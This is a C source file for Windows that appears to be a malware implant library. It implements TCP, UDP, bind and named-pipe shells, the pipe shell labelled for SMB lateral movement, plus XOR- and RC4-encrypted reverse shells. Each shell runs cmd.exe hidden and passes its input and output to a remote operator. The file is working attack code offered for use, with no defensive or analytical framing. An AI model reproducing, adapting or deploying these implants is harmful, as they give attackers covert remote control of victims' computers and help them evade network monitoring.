/*
 * Reverse Shell - TCP, UDP, Pipe, Encrypted
 * Core implant communication patterns
 */

#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

// ============================================================================
// CONFIG
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD ip;
    WORD  port;
    BYTE  key;
} CFG;
#pragma pack(pop)

// ============================================================================
// TCP REVERSE SHELL - Classic
// ============================================================================

void rev_tcp(DWORD ip, WORD port)
{
    WSADATA ws;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    WSAStartup(0x0202, &ws);

    s = WSASocketA(2, 1, 6, 0, 0, 0);  // AF_INET, SOCK_STREAM, IPPROTO_TCP

    sa.sin_family = 2;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = ip;

    if(connect(s, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
        si.dwFlags = 0x100;  // STARTF_USESTDHANDLES
        si.hStdInput = (HANDLE)s;
        si.hStdOutput = (HANDLE)s;
        si.hStdError = (HANDLE)s;

        CreateProcessA(0, "cmd.exe", 0, 0, 1, 0x08000000, 0, 0, &si, &pi);
        WaitForSingleObject(pi.hProcess, -1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(s);
    WSACleanup();
}

// ============================================================================
// ENCRYPTED SHELL - XOR traffic
// ============================================================================

void rev_xor(DWORD ip, WORD port, BYTE key)
{
    WSADATA ws;
    SOCKET s;
    struct sockaddr_in sa;

    WSAStartup(0x0202, &ws);
    s = socket(2, 1, 0);

    sa.sin_family = 2;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = ip;

    if(connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0)
        return;

    while(1) {
        char cmd[4096], out[0x10000];
        int len;

        len = recv(s, cmd, sizeof(cmd) - 1, 0);
        if(len <= 0) break;

        // Decrypt
        for(int i = 0; i < len; i++) cmd[i] ^= key;
        cmd[len] = 0;

        // Execute
        SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
        HANDLE hR, hW;
        CreatePipe(&hR, &hW, &sa, 0);

        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = 0x100;
        si.hStdOutput = hW;
        si.hStdError = hW;

        char exec[4200];
        lstrcpyA(exec, "cmd.exe /c ");
        lstrcatA(exec, cmd);

        if(CreateProcessA(0, exec, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
            CloseHandle(hW);

            DWORD total = 0, rd;
            while(ReadFile(hR, out + total, sizeof(out) - total - 1, &rd, 0) && rd)
                total += rd;

            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            // Encrypt output
            for(DWORD i = 0; i < total; i++) out[i] ^= key;
            send(s, out, total, 0);
        }
        CloseHandle(hR);
    }

    closesocket(s);
    WSACleanup();
}

// ============================================================================
// BIND SHELL
// ============================================================================

void bind_shell(WORD port)
{
    WSADATA ws;
    SOCKET srv, cli;
    struct sockaddr_in sa;

    WSAStartup(0x0202, &ws);
    srv = socket(2, 1, 0);

    sa.sin_family = 2;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = 0;

    bind(srv, (struct sockaddr*)&sa, sizeof(sa));
    listen(srv, 1);
    cli = accept(srv, 0, 0);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 0x100;
    si.hStdInput = (HANDLE)cli;
    si.hStdOutput = (HANDLE)cli;
    si.hStdError = (HANDLE)cli;

    CreateProcessA(0, "cmd.exe", 0, 0, 1, 0x08000000, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, -1);

    closesocket(cli);
    closesocket(srv);
    WSACleanup();
}

// ============================================================================
// UDP SHELL - Stateless
// ============================================================================

void rev_udp(DWORD ip, WORD port)
{
    WSADATA ws;
    SOCKET s;
    struct sockaddr_in sa, from;
    int fromlen = sizeof(from);

    WSAStartup(0x0202, &ws);
    s = socket(2, 2, 0);  // SOCK_DGRAM

    sa.sin_family = 2;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = ip;

    sendto(s, "RDY", 3, 0, (struct sockaddr*)&sa, sizeof(sa));

    while(1) {
        char cmd[4096], out[0x10000];
        int len = recvfrom(s, cmd, sizeof(cmd) - 1, 0, (struct sockaddr*)&from, &fromlen);
        if(len <= 0) continue;
        cmd[len] = 0;

        SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
        HANDLE hR, hW;
        CreatePipe(&hR, &hW, &sa, 0);

        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = 0x100;
        si.hStdOutput = hW;
        si.hStdError = hW;

        char exec[4200];
        lstrcpyA(exec, "cmd.exe /c ");
        lstrcatA(exec, cmd);

        if(CreateProcessA(0, exec, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
            CloseHandle(hW);

            DWORD total = 0, rd;
            while(ReadFile(hR, out + total, sizeof(out) - total, &rd, 0) && rd)
                total += rd;

            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            sendto(s, out, total, 0, (struct sockaddr*)&from, fromlen);
        }
        CloseHandle(hR);
    }
}

// ============================================================================
// NAMED PIPE SHELL - SMB lateral movement
// ============================================================================

void pipe_shell(char* name)
{
    HANDLE hPipe;
    char buf[4096];
    DWORD rd, wr;

    hPipe = CreateFileA(name, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
    if(hPipe == INVALID_HANDLE_VALUE) return;

    DWORD mode = 2;  // PIPE_READMODE_MESSAGE
    SetNamedPipeHandleState(hPipe, &mode, 0, 0);

    while(1) {
        if(!ReadFile(hPipe, buf, sizeof(buf) - 1, &rd, 0) || !rd) break;
        buf[rd] = 0;

        SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
        HANDLE hR, hW;
        CreatePipe(&hR, &hW, &sa, 0);

        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = 0x100;
        si.hStdOutput = hW;
        si.hStdError = hW;

        char cmd[4200];
        lstrcpyA(cmd, "cmd.exe /c ");
        lstrcatA(cmd, buf);

        if(CreateProcessA(0, cmd, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
            CloseHandle(hW);

            char out[0x10000];
            DWORD total = 0;
            while(ReadFile(hR, out + total, sizeof(out) - total, &rd, 0) && rd)
                total += rd;

            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

            WriteFile(hPipe, out, total, &wr, 0);
        }
        CloseHandle(hR);
    }

    CloseHandle(hPipe);
}

// ============================================================================
// PIPE SERVER - Create pipe for incoming connections
// ============================================================================

void pipe_server(char* name)
{
    HANDLE hPipe = CreateNamedPipeA(
        name,
        0x3,     // PIPE_ACCESS_DUPLEX
        0x4 | 0x2 | 0,  // TYPE_MESSAGE | READMODE_MESSAGE | WAIT
        1,       // Max instances
        4096,    // Out buffer
        4096,    // In buffer
        0,       // Timeout
        0);

    if(hPipe == INVALID_HANDLE_VALUE) return;

    ConnectNamedPipe(hPipe, 0);

    // Same command loop as pipe_shell
    char buf[4096];
    DWORD rd, wr;

    while(ReadFile(hPipe, buf, sizeof(buf) - 1, &rd, 0) && rd) {
        buf[rd] = 0;
        // Execute and return output...
    }

    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
}

// ============================================================================
// INLINE SHELL EXEC - No cmd.exe
// ============================================================================

DWORD exec_inline(char* cmd, char* out, DWORD outlen)
{
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
    HANDLE hR, hW;
    CreatePipe(&hR, &hW, &sa, 0);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 0x100;
    si.hStdOutput = hW;
    si.hStdError = hW;

    if(!CreateProcessA(0, cmd, 0, 0, 1, 0x08000000, 0, 0, &si, &pi)) {
        CloseHandle(hR);
        CloseHandle(hW);
        return 0;
    }

    CloseHandle(hW);

    DWORD total = 0, rd;
    while(ReadFile(hR, out + total, outlen - total - 1, &rd, 0) && rd)
        total += rd;

    out[total] = 0;

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hR);

    return total;
}

// ============================================================================
// RC4 ENCRYPTED SHELL
// ============================================================================

void rc4_xform(BYTE* d, DWORD dl, BYTE* k, DWORD kl)
{
    BYTE S[256];
    for(int i = 0; i < 256; i++) S[i] = i;
    for(int i = 0, j = 0; i < 256; i++) {
        j = (j + S[i] + k[i % kl]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
    }
    for(DWORD n = 0, i = 0, j = 0; n < dl; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
        d[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

void rev_rc4(DWORD ip, WORD port, BYTE* key, DWORD keylen)
{
    WSADATA ws;
    SOCKET s;
    struct sockaddr_in sa;

    WSAStartup(0x0202, &ws);
    s = socket(2, 1, 0);

    sa.sin_family = 2;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = ip;

    if(connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) return;

    while(1) {
        BYTE cmd[4096], out[0x10000];
        int len = recv(s, (char*)cmd, sizeof(cmd), 0);
        if(len <= 0) break;

        rc4_xform(cmd, len, key, keylen);
        cmd[len] = 0;

        DWORD outlen = exec_inline((char*)cmd, (char*)out, sizeof(out));

        rc4_xform(out, outlen, key, keylen);
        send(s, (char*)out, outlen, 0);
    }

    closesocket(s);
    WSACleanup();
}

// ============================================================================
// EOF
// ============================================================================
